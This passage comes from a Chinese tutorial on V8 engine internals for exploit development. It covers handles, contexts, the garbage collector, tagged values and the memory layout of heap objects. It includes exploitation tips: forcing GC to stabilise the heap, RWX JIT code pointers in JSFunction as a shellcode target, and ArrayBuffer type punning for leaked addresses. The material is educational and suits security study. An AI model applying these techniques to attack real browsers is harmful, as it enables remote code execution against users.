alt=""><br>顺便说一下，ToLocalChecked()是一个no-NULL检查函数。</p><p>本节介绍以下内容<br>我只是总结了我不知道的概念<br>从exploit的角度来看，它们都不是那么重要，但是最好从源码上了解</p><ul><li>Handle/HandleScope</li><li>Context</li><li>Isolate</li><li>Platform</li><li>Interpreter</li><li>blob</li><li>ICU</li><li>third_party</li><li>tools</li></ul><p>参考资料：<a href="https://github.com/v8/v8/wiki/Embedder&#39;s-Guide" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/Embedder&#39;s-Guide</a></p><h3 id="Handle-HandleScope"><a href="#Handle-HandleScope" class="headerlink" title="Handle/HandleScope"></a>Handle/HandleScope</h3><ul><li>Handle<ul><li>要启用GC跟踪，指针包装类型<ul><li>为了对应任何类型的指针，请使用C++模板</li><li>在源代码中，所有Object都使用此Handle<t>类型进行管理</t></li><li>GC有可能移动Object的位置<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-124518.png" alt=""><br>即使GC移动该Object，由于handle不移动，所以没有不一致</li></ul></li><li>常用Handle<ul><li>Handle<t><ul><li>Abstract class</li></ul></t></li><li>Local<t><ul><li>Temporary Handle, 保留在stack上</li><li><strong>使用后面将介绍的HandleScope进行生命周期管理</strong></li></ul></t></li><li>MaybeLocal<t><ul><li>它与Local<t>相同，但在使用前检查它是否为空</t></li></ul></t></li><li>Persistent<t><ul><li>一个persistent Handle,保留在heap上</li><li>代码编写器使用Persistent::Reset（）管理生命周期</li></ul></t></li></ul></li></ul></li><li>HandleScope<ul><li>handle总结<ul><li>Temporary Handle such as Local <t>, MaybeLocal<t></t></t></li><li>在声明HandleScope时，块中的每个handle都会自动关联</li></ul></li><li><strong>当HandleScope超出范围时，它会处理释放handle</strong><ul><li>返回函数时，结束{}时，等</li><li>用所有使用的handle来描述释放处理是低效的</li><li>使用HandleScope的析构函数，GC负责实际的释放处理</li></ul></li><li>参考以下的文件<ul><li>include/v8.h，src/handles.h</li></ul></li></ul></li></ul><h3 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h3><ul><li>在一个V8实例中创建多个执行环境的机制<ul><li>您可以在一个线程中同时运行彼此独立的JavaScript代码</li></ul></li><li>每个Context对象都有一个全局的Root-Object</li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-132114.png" alt=""><br>左边：每个context都有一个Root-Object，并且彼此独立（在本例中，context是嵌套的，但Root-Object正确切换）<br>右边：总之，它实现了环境的切换。 我们希望分别通过window，iframe和extended script来独立保护环境。所谓的origin也是在Context中定义的，并且从一个Context到另一个Context的访问不能被默认完成。</p><h3 id="Isolate"><a href="#Isolate" class="headerlink" title="Isolate"></a>Isolate</h3><ul><li>Instance of V8 itself<ul><li>context是在同一个instance中实现不同的执行环境</li><li>当你想运行自己的多个实例时使用Isolate<ul><li>为了适应多线程</li></ul></li></ul></li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-133452.png" alt=""></p><h3 id="Platform"><a href="#Platform" class="headerlink" title="Platform"></a>Platform</h3><ul><li>It seems to define the operating environment (it seems)<ul><li>线程相关<ul><li>决定后台线程和前台线程</li><li>管理线程池</li></ul></li><li>任务队列管理</li><li>事件追踪</li></ul></li></ul><p><strong>我没有很好理解，因为没有真实的信息</strong></p><p>参考</p><ul><li>include/v8-platform.h</li><li>src/libplatform/default-platform.cc</li></ul><h3 id="Interpreter"><a href="#Interpreter" class="headerlink" title="Interpreter"></a>Interpreter</h3><ul><li>In V8, two Interpreters are prepared<ul><li>d8<ul><li>构建src/d8.cc，可以用参数指定各种选项</li><li>debug-shell d8 in the sense of V8</li><li>如果你不用一个文件作为参数去运行它，它将作为interactive interpreter运行。</li><li>当文件被指定为参数时，它将被解析为JavaScript并执行</li></ul></li><li>shell<ul><li>构建samples/shell.cc</li><li>主要操作与d8相同，但功能减少且轻量级</li><li>它可以用于对CTF中的V8的jsp问题进行调试</li></ul></li></ul></li></ul><h3 id="blob"><a href="#blob" class="headerlink" title="blob"></a>blob</h3><ul><li>关于snapshot文件<ul><li>V8在初始化时在内部生成内置JavaScript代码<ul><li>尽管这些代码可以每次使用时进行编译，但是效率不高。</li></ul></li><li>所以在编译阶段预先准备好他们。<ul><li>它只需要在启动时读取，因此初始化变得更快</li><li>在构建V8时，他们一起生成</li></ul></li><li>snapshot可以在程序内部/外部进行<ul><li>当snapshot文件被放置在外部的时候，就是blob</li><li>There are two of natives_blob.bin and snapshot_blob.bin<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-164154.png" alt=""></li></ul></li></ul></li></ul><h3 id="ICU"><a href="#ICU" class="headerlink" title="ICU"></a>ICU</h3><ul><li>International Components for Unicode<ul><li>也就是说，与Unicode有关的外部库</li></ul></li><li>参考下面的链接：<ul><li><a href="https://github.com/v8/v8/wiki/i18n-support" target="_blank" rel="noopener">https://github.com/v8/v8/wiki/i18n-support</a></li><li>src/icu_util.cc</li></ul></li></ul><h3 id="third-party"><a href="#third-party" class="headerlink" title="third_party"></a>third_party</h3><ul><li>和v8捆绑的工具(=被用来构建等)<ul><li>icu, binutils, llvm, etc.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-165002.png" alt=""></li></ul></li><li>它可以根据需要进行更换<ul><li>在使用Ubuntu 16.04进行构建时，由于其下属的ld.gold报错，因此通过系统链接程序的符号链接（/usr/bin/ld.gold）<ul><li>ld.gold是Google在2012年左右制作的ld的高速版本</li></ul></li><li>使用GYP_DEFINES，您也可以替换环境变量</li></ul></li></ul><h3 id="tools"><a href="#tools" class="headerlink" title="tools"></a>tools</h3><ul><li>GDB扩展命令已准备好用于调试目的<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-165454.png" alt=""><ul><li>gdb-peda$ source tools/gdbinit</li><li>gdb-peda$ source tools/gdb-v8-support.py</li><li>如果你这样做，你可以增加gdb命令<ul><li>也许你可以使用Ok</li></ul></li><li>tools/ Because there are various other things under his eyes</li></ul></li><li>但是，由于我们的案例是在2016年，因此需要进行一些修改<ul><li>gdbinit<ul><li>由于出现与命名空间相关的错误，因此使用“’修补它即可（？？？）</li></ul></li><li>gdb-v8-support.py<ul><li>由于python 3语法错误出现，所以可以在打印语句OK中放入括号<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-165926.png" alt=""></li></ul></li><li>此外，该文件的内容在最新的V8中已更改<ul><li>我还没有确认这一点。</li></ul></li></ul></li><li>For example, v8print and job commands display HeapObject cleanly<ul><li>对象的结构将在后面描述</li><li>由于map有各种标志，最好在这里查看<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-10-173611.png" alt=""></li></ul></li></ul><ol><li>例如，[0xdeadbee，0xdeadbeef，“hoge”]<br>显示FixedArray（减去0x14，因为它指向FixedArray的第一个偏移量）</li><li>我试图显示FixedArray的Map的内容</li><li>实际上，我不必费心使用v8print命令，但我觉得直接调用内部函数可以调用__gdb_print_v8_object（address），如果我传入一个奇怪的地址，我无法通过SEGV恢复它，所以我直接看内存,它会更安全。</li></ol><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>其他的细节<ul><li>Macro-intensive use<ul><li>如果对源代码进行grep找不到定义，则可能有宏</li><li>寻找宏的定义是很好的（在源码中的某处#define 〜）</li><li>In particular, many macros based on the token concatenation operator (##) are used<ul><li><code>#define HOGE(name,type) hoge_name_##type();</code></li><li>当我找不到它时，一般会有很多模式</li></ul></li></ul></li><li><code>__asm __（“int 3”）</code>不能嵌入到IC或机器语言生成系统的功能中<ul><li>做一个blob作为构建过程的一部分</li><li>目前这些代码似乎被使用，并且在很多情况下构建失败</li></ul></li><li>namespace<ul><li>i是v8::internal的别名<ul><li>namespace i = v8::internal;(src/globals.h)</li></ul></li></ul></li><li>Changes will be made immediately<ul><li>你现在看的源码和最新的可能大有不同。<ul><li>如果您认为将其与最新版本进行比较很有趣</li><li><a href="https://cs.chromium.org/chromium/src/v8/" target="_blank" rel="noopener">https://cs.chromium.org/chromium/src/v8/</a></li></ul></li></ul></li><li>以下是非常有用的<br><a href="https://github.com/danbev/learning-v8/blob/master/README.md" target="_blank" rel="noopener">https://github.com/danbev/learning-v8/blob/master/README.md</a></li></ul></li></ul><h2 id="关于V8的GC"><a href="#关于V8的GC" class="headerlink" title="关于V8的GC"></a>关于V8的GC</h2><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://github.com/thlorenz/v8-perf/blob/master/gc.md" target="_blank" rel="noopener">https://github.com/thlorenz/v8-perf/blob/master/gc.md</a><br><a href="https://github.com/joyeecheung/v8-gc-talk" target="_blank" rel="noopener">https://github.com/joyeecheung/v8-gc-talk</a></p><h3 id="垃圾收集器（GC）"><a href="#垃圾收集器（GC）" class="headerlink" title="垃圾收集器（GC）"></a>垃圾收集器（GC）</h3><ul><li><p>另一个重要组件是垃圾收集器</p><ul><li>一种在V8中单独管理JavaScript对象（称为HeapObject）的机制<ul><li>如何检测废弃的对象并自动释放它们</li></ul></li><li>使用与Linux heap不同的区域</li></ul></li><li><p>GC区域</p><ul><li>除heap以外，还有多个由mmap保护的区域</li><li>V8内部使用的各种HeapObject被保留在这个区域<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-025437.png" alt=""></li></ul></li><li><p>heap区域</p><ul><li>如果不是js object（=不应该由GC管理），用c++语言管理普通object</li><li>虽然是一个JavaScript object，但有些例外，存放在heap而不是HeapObject（例如JSArrayBuffer的BackingStore）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-025736.png" alt=""></li></ul></li></ul><p>GC中有2种generation(= regions with different management methods)</p><ol><li>Young Generation</li><li>Old Generation</li></ol><p>根据GC中object的生存时间，它被分为两类generation ，Young/Old (and New/Old described later)<br>这不是关于V8版本之间的区别<br>除此之外，还有一些区域不属于任何一个generation<br>为了方便起见，它被写为Other，但是其实是关于Large Object Space</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-032534.png" alt=""></p><p>在源代码中，有些地方包含Old generation的large object space的描述，但基本上认为它们是不同的东西</p><h3 id="Young-Generation"><a href="#Young-Generation" class="headerlink" title="Young Generation"></a>Young Generation</h3><ul><li><p>New Space</p><ul><li>新创建的object被保留在这里，并且受到GC管理</li><li>Almost all objects</li><li>code object，map object和large object被排除在外<ul><li>除了看源码之外还有其他的东西，但是从exploit的视角看不重要</li></ul></li></ul></li><li><p>The GC algorithm is Cheney’s algorithm</p><ul><li><p>为了使用这种算法，它进一步分为两个区域</p><ul><li>ToSpace</li><li>FromSpace<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-062509.png" alt=""></li></ul></li><li><p>这个GC在源码里被称为Scavenge</p><ul><li><strong>我会解读它，因为它很重要。</strong></li><li>这一次我会解读2016年的GC，但最近这个算法发生了变化，与并行化兼容<br>参考资料：<a href="https://v8project.blogspot.jp/2017/11/" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/11/</a></li></ul></li></ul></li><li>Cheney’s algorithm<ul><li>Each object is reserved from the beginning of ToSpace<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-062616.png" alt=""></li><li>当memory exhaustion（空间用罄）时候，GC被调用</li><li>主线程的操作(Javascript执行的线程)被暂停<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-062838.png" alt=""></li><li>Switch To Space and From Space</li><li>Actually dealing with pointer swap (flip)<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-070014.png" alt=""></li><li>仅将living object复制到To Space<ul><li>首先，确保live (= alive), copy one starting object。<ul><li>有各种各样的root objects (such as global objects, built-in objects, local objects within the scope of living, etc. ）<br>有各种各样的说法，详情请参阅heap/heap.cc的IterateRoots()。</li><li>从Old side可以访问的object (由后面讲解的Write Barrier mechanism管理), etc.<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-070702.png" alt=""></li></ul></li><li>顺次复制living的object。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-071307.png" alt=""><ul><li>还有一些要复制到old generation的object<br> <strong>正如我们后面将会看到的那样,两次在young generation的GC中幸存下来的对象，被复制到old generation的空间而不是复制到ToSpace</strong></li></ul></li><li>完成后，重新选择root并重复复制。</li></ul></li><li>再次分配之前未分配完成的obj-e<ul><li>From Space中还有garbage存在，但是因为我们不会再次使用它们，所以无所谓。</li><li>之后，每次GC发生时，都会重复上面这一系列的流程<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-072518.png" alt="">    </li></ul></li></ul></li></ul><h3 id="Old-Generation"><a href="#Old-Generation" class="headerlink" title="Old Generation"></a>Old Generation</h3><ul><li>old space<ul><li>long-lived objects存放的区域<ul><li>New Space中, 在两次GC之后存活下来的object <ul><li>更多细节参考Heap::ShouldBePromoted()</li></ul></li><li>old space发生GC的频率比new space少（取决于使用过程）<ul><li>如果一个object被移动到old space，该object不会受到GC更改layout的影响<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-191321.png" alt=""></li></ul></li></ul></li></ul></li><li>code space<ul><li>仅适用于JIT的code object<ul><li>由于code object是RWX，因此它从一开始就保留在此区域中<ul><li>由于它是JIT代码，因此不仅要读取（R）写入（W），还要执行（X），因此memory permissions与其他的地方不同。</li></ul></li></ul></li></ul></li><li><p>Map Space</p><ul><li>仅Map object<ul><li>出于GC效率的考虑，Map object从一开始就位于此区域<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-192033.png" alt=""></li></ul></li></ul></li><li><p>old generation的GC算法是Mark-Sweep-Compact</p><ul><li>除New Space区域以外的所有算法</li><li>由于它与Exploit无关，因此省略了详细信息<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-11-192358.png" alt=""></li></ul></li></ul><h3 id="Other"><a href="#Other" class="headerlink" title="Other"></a>Other</h3><ul><li>Large Object Space<ul><li>保留600KB或更大的object的区域<ul><li>它由mmap直接分配</li><li>如果有多个安全区域，请使用链表进行管理</li><li>它不在GC中移动</li></ul></li></ul></li></ul><h3 id="Write-Barrier"><a href="#Write-Barrier" class="headerlink" title="Write Barrier"></a>Write Barrier</h3><ul><li><a href="https://v8project.blogspot.jp/2016/04/jank-busters-part-two-orinoco.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2016/04/jank-busters-part-two-orinoco.html</a></li><li><p><a href="https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group" target="_blank" rel="noopener">https://www.slideshare.net/NodejsFoundation/are-your-v8-garbage-collection-logs-speaking-to-youjoyee-cheung-alibaba-cloudalibaba-group</a></p></li><li><p>对应于从old/large一侧，指向young一侧的object的场合</p><ul><li>当你在Young进行GC时，Young side的object会移动<ul><li>因此old/large一侧所持有的指针就变成无效的了</li><li>虽然有必要对old/large一侧中的指针进行修正，但是希望在young的gc过程中避免对old/large进行扫描</li></ul></li><li>对这样的指针事先使用store buffer + remembered set进行管理<ul><li>在young进行gc时，利用这些的信息对old/large一侧的指针进行处理<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-071623.png" alt=""></li></ul></li></ul></li></ul><h3 id="从Exploit的角度来看"><a href="#从Exploit的角度来看" class="headerlink" title="从Exploit的角度来看"></a>从Exploit的角度来看</h3><ul><li>In case of exploit repeating memory allocation/release<ul><li>When GC runs at Young Generation, memory layout collapses<ul><li>It is more stable to intentionally activate the GC in advance and move the object as much as possible to Old Generation</li><li>In order to cause GC, it is sufficient to secure a lot of memory (= non-large) in detail</li></ul></li></ul></li><li>In case of heap BOF type exploit<ul><li>Each object does not have metadata for GC (concrete example will be described later)<ul><li>Meta data such as size and prev_size in the malloc chunk are not particularly used for GC applications</li><li>Since the reserved JS object is used like a structure, there are various information inside the JS object, but there are no headers in the JS object itself, and each JS object is secured consecutively</li></ul></li><li>In other words, the technique of the metadata destroying system which is well-known in the Linux heap basically does not exist on the GC<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-081239.png" alt=""></li></ul></li></ul><h2 id="v8对象模型"><a href="#v8对象模型" class="headerlink" title="v8对象模型"></a>v8对象模型</h2><h3 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="http://steps.dodgson.org/bn/2008/09/07/" target="_blank" rel="noopener">http://steps.dodgson.org/bn/2008/09/07/</a></p><h3 id="V8的object"><a href="#V8的object" class="headerlink" title="V8的object"></a>V8的object</h3><ul><li>Object<ul><li>v8自己创建的各种各样的类<ul><li>和GC合作</li></ul></li><li>针对C++类结构制作一个触发器<ul><li>例如，V8的object没有成员变量</li><li>它既没有虚函数，也没有构造函数/析构函数</li><li></li></ul></li><li>细节参考src/objects.h,src/objects-inl.h等<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-102645.png" alt=""></li></ul></li><li>Exploit<ul><li>了解每个object的内存结构非常重要</li><li>在本文件中，我们将主要讲述下面的内容<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-124349.png" alt=""><h3 id="继承关系"><a href="#继承关系" class="headerlink" title="继承关系"></a>继承关系</h3><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133831.png" alt=""></li></ul></li></ul><h3 id="Object和Tagged-Value"><a href="#Object和Tagged-Value" class="headerlink" title="Object和Tagged Value"></a>Object和Tagged Value</h3><h4 id="Object"><a href="#Object" class="headerlink" title="Object"></a>Object</h4><ul><li>Object<ul><li>它由以下两种类型组成</li><li>Smi(Small Integer)<ul><li>整数值<ul><li>整数由带符号的31位范围表示（在32位环境的情况下）</li><li>整数由带符号的32位范围表示（在64位环境的情况下）</li></ul></li></ul></li><li>HeapObject<ul><li>除整数值之外的其他类<ul><li>也适用于不能在Smi范围内表达的整数<ul><li>Double value and hold at the end of the pointer (= HeapNumber object)</li></ul></li><li>始终有一个指向Map的指针</li></ul></li><li>由于HeapObject基本上由GC管理，因此它位于GC区域（它不存放在堆区域）</li></ul></li></ul></li></ul><h4 id="Smi"><a href="#Smi" class="headerlink" title="Smi"></a>Smi</h4><p>如果一个成员的值是一个整数，那么存储它的速度会更快<br>这就是使用Smi的原因（我认为这是原因）</p><ul><li><p>对于使用指针来创建一个整数对象(B)的实现，如图<br>指针必须被追踪一次，内存访问两次（慢）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-141551.png" alt=""></p></li><li><p>对于省略了指向整数对象(B)的指针并且整数直接存放在内部的实现，如图<br>指针应该指向的整数值在V8中被称为Smi<br>没有必要跟随指针，内存访问执行一次（快速）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-12-141811.png" alt=""></p></li></ul><h4 id="Tagged-Values"><a href="#Tagged-Values" class="headerlink" title="Tagged Values"></a>Tagged Values</h4><ul><li><p>Tagged Values</p><ul><li>同时表示指向Smi和HeapObject的指针的机制<ul><li>但是，不可能区分它们是整数值还是指针<ul><li>低1位(LSB)是一个标志</li></ul></li></ul></li></ul></li><li><p>Smi(=Object)</p><ul><li>如果LSB为0，则可以通过右移1位获得原始值<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-073048.png" alt=""></li><li>如果LSB为0，则可以通过右移32位获得原始值<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-073104.png" alt=""></li></ul></li><li><p>指向HeapObject的指针</p><ul><li>32位<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-073143.png" alt=""></li><li>64位<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-073127.png" alt=""><br>  由于GC上的chunk在32位环境中的4字节对齐，64位环境中是8字节对齐的，因此LSB始终为0。也就是说，当它存储在内存中时，将其LSB设置为1即代表指针。</li></ul></li></ul><h3 id="HeapNumber"><a href="#HeapNumber" class="headerlink" title="HeapNumber"></a>HeapNumber</h3><ul><li>对象的值为double<ul><li>数字表达式不能在Smi范围内表达</li><li>继承Object, HeapObject<ul><li>内存结构如下所示（64位环境下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-074944.png" alt=""><br>V8的HeapObject完全没有任何成员变量，它完全由偏移量独立表示。<br>为了画起来方便，我们将其视为变量名称，并如右图所示表示（对于后续幻灯片也是如此）</li></ul></li></ul></li><li>实际演示<ul><li>Smi值(0xdeadbee)和double值(0xdeadbeef，由于它大于0x7fffffff，非Smi)存放在数组中<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-080724.png" alt=""><br>搜索</li></ul></li><li>由于0xdeadbee是Smi，因此可以通过在内存中搜索，来查找存储在数组中的值。（换句话说，直接看数组里对应的值就行了）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-081323.png" alt=""></li><li>0xdeadbee（Smi）之后的元素应该是0xdeadbeef（HeapNumber）<br>0x41ebd5b7dde00000是0xdeadbeef的double值表示<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-081433.png" alt=""></li><li>HeapNumber对象和其他对象连续，保证没有任何间隙<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-083012.png" alt=""></li></ul><h3 id="PropertyCell"><a href="#PropertyCell" class="headerlink" title="PropertyCell"></a>PropertyCell</h3><ul><li>Object meaning variable<ul><li>继承Object，HeapObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084028.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放Smi值(0xdeadbee)</li><li>使用0xdeadbee搜索此PropertyCell的在内存中的位置</li><li>尝试覆盖变量的值<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084248.png" alt=""></li><li>由于0xdeadbee是Smi，它的值可以通过在内存中搜索找到。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084442.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084529.png" alt=""></li><li>更改为字符串<ul><li>如果你像以前一样检查相同的地址，则kValueOffset所保持的值会更改</li><li>指向的地址是一个表示“hoge”的String对象（String对象的细节将在后面描述）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-084737.png" alt=""></li></ul></li></ul></li></ul><h3 id="String"><a href="#String" class="headerlink" title="String"></a>String</h3><ul><li>保存字符串的对象<ul><li>继承Object, HeapObject, Name<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-085209.png" alt=""></li></ul></li></ul></li><li>实际演示<ul><li>存放在数组中的字符串“hoge”，“fuga”</li><li>用0xdeadbee查找这个数组的内存位置</li><li>由于0xdeadbee是Smi，因此你可以发现这个在数组中的值，通过在内存中搜索。基于此，确定数组的内存位置</li><li>跟在0xdeadbee（Smi）之后的元素应该是一个String对象，如“hoge”或“fuga”<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-124837.png" alt=""></li><li>“hoge”和“fuga”连续存放，没有缺口。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-125413.png" alt=""></li></ul></li></ul><h3 id="Oddball"><a href="#Oddball" class="headerlink" title="Oddball"></a>Oddball</h3><ul><li><p>表示特殊值的对象，例如true，false，undefined</p><ul><li>继承object，HeapObject<ul><li>内存结构如下（在64位环境的情况下）</li></ul></li></ul></li><li><p>实际演示</p><ul><li>确保true，false等在数组中<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133139.png" alt=""></li><li>用0xdeadbee查找这个数组的内存位置</li><li>0xdeadbee（Smi）的下一个元素应该是一个Oddball对象，如true或false<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133222.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133358.png" alt=""></li></ul></li><li>顺便说一下，种类的定义就是这样<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-133447.png" alt=""></li></ul><h3 id="JSObject"><a href="#JSObject" class="headerlink" title="JSObject"></a>JSObject</h3><h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://v8project.blogspot.jp/2017/08/fast-properties.html" target="_blank" rel="noopener">https://v8project.blogspot.jp/2017/08/fast-properties.html</a></p><h4 id="JSObject-1"><a href="#JSObject-1" class="headerlink" title="JSObject"></a>JSObject</h4><ul><li>表示JavaScript对象的对象<ul><li>继承自Object，HeapObject，JSReceiver</li><li>对于想要了解element的properties和description的人，请参阅上面给出的参考链接<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-134206.png" alt=""></li></ul></li><li>properties<ul><li>It is called NamedProperties and manages elements accessed by name. The entity is FixedArray</li><li>Management when an object has a property (like a.x)</li></ul></li><li>element<ul><li>It is called IndexedProperties and manages elements accessed by index. The entity is FixedArray</li><li>Management when an object has an index (like a[0])<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-141036.png" alt=""></li></ul></li></ul><h3 id="JSFunction"><a href="#JSFunction" class="headerlink" title="JSFunction"></a>JSFunction</h3><ul><li><p>Object holding JavaScript function</p><ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-141352.png" alt=""></li></ul></li></ul></li><li><p>实际演示</p><ul><li>存放function f()在数组中</li><li>用0xdeadbee查找这个数组的内存位置<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-142310.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-142325.png" alt=""></li><li><p>kCodeEntryOffset is a pointer to the JIT code (RWX area), many strategies to realize arbitrary code execution by writing shellcode before this</p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-142516.png" alt=""></p></li></ul></li></ul><h3 id="JSArray"><a href="#JSArray" class="headerlink" title="JSArray"></a>JSArray</h3><ul><li>Object holding a JavaScript array<ul><li>继承Object, HeapObject, JSReceiver, JSObject<ul><li>内存结构如下（在64位环境的情况下）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-143216.png" alt=""></li></ul></li></ul></li><li>实际演练<ul><li>由于0xdeadbee是Smi，因此可以通过在内存中搜索来查找存储在数组中的值。 基于此，查找数组的内存位置（因为有一些候选项，请小心）<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-155446.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-155649.png" alt=""></li><li>如果增加数组的元素，它将自动扩大<ul><li>第三个和第四个元素被添加到只有两个元素的数组中<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-160146.png" alt=""></li></ul></li><li>当元素的数量增加时，它会扩展长度（FixedArray存放到另一个位置，并且kElementsOffset所保存的指针改变）</li><li>顺便说一下，有很多0x186e00404369代表TheHoleObject的地址（Oddball的kind = 2意思是void）<br>  <img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-160210.png" alt=""></li></ul></li><li>注意<ul><li>在一个数组中，有时会存储一个double值的情况<ul><li>它是一个非Smi范围，但它被存储为一个double值而不是HeapNumber地址</li><li>Smi范围，但存储为double值而不是Smi表示</li></ul></li><li>Perhaps, it seems to be to decide the type of the entire array and speed up it<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-13-161601.png" alt=""></li></ul></li></ul><h3 id="JSArrayBuffer"><a href="#JSArrayBuffer" class="headerlink" title="JSArrayBuffer"></a>JSArrayBuffer</h3><h4 id="ArrayBuffer-and-TypedArray"><a href="#ArrayBuffer-and-TypedArray" class="headerlink" title="ArrayBuffer and TypedArray"></a>ArrayBuffer and TypedArray</h4><ul><li>Originally ArrayBuffer<ul><li>一个可以直接从JavaScript访问内存的特殊数组<ul><li>但是，ArrayBuffer仅准备一个内存缓冲区</li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-151055.png" alt=""></li><li>为了实际访问，有必要一起使用TypedArray或DataView<ul><li>TypedArray是low function，但因为它不会执行额外的操作，所以访问速度很快。</li><li>对于Exploit，最好不要做额外的事情（当发生意想不到的事情时很麻烦），因此比起DataView，我们更多的使用TypedArray。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-151829.png" alt=""></li></ul></li></ul></li><li>使用例子 (TypedArray版本)<ul><li>创建方法1，仅指定长度，初始化为零<br>t_arr = new Uint8Array(128) //ArrayBuffer被创建在内部</li><li>创建方法2，使用特定值初始化<br>t_arr = new Uint8Array([4,3,2,1,0]) //ArrayBuffer被创建在内部</li><li>创建方法3，事先构建缓冲区并使用它<br>arr_buf = new ArrayBuffer(8);<br>t_arr1 = new Uint16Array(arr_buf); //创建一个Uint16数组<br>t_arr2 = new Uint16Array(arr_buf, 0, 4); //或者，您也可以指定数组的开始和结束位置</li></ul></li><li>ArrayBuffer可以在不同的TypedArray之间共享<ul><li>它也可以用于double和int的类型转换<ul><li><strong>类型转换的意义在于改变字节序列的解释，而不是转换</strong></li><li>就像C语言的Union</li></ul></li><li>BackingStore——可以使用TypedArray指定的类型读取和写入该区域，例如作为原始数据数组访问的8位或32位内存<br><img src="http://onc55v8te.bkt.clouddn.com/2018-05-14-153219.png" alt=""></li><li>①预先准备ArrayBuffer<br>var ab = new ArrayBuffer(0x100);</li><li>②向ArrayBuffer中写入一个Float64的值<br>var t64 = new Float64Array(ab);<br>t64[0] = 6.953328187651540e-310;//字节序列是0x00007fffdeadbeef<br><strong>–&gt;当某些地址在V8上泄露时，通常在大多数情况下被迫将其解释为双精度值，为了正确计算偏移量等，需要将其转换为整数值。 对于完成该转换，ArrayBuffer是最佳的</strong></li><li>③从ArrayBuffer读取两个Uint32<br>var t32 = new Uint32Array(ab);<br>k = [t32[1],t32[0]]<br><strong>–&gt;k是6.953328187651540e-310,将字节序列按照4个字节去分开，然后解释为Uint32,于是得到:</strong><br><strong>k=[0x00007fff，0xdeadbeef]</strong></li></ul></li></ul></li></ul><h4 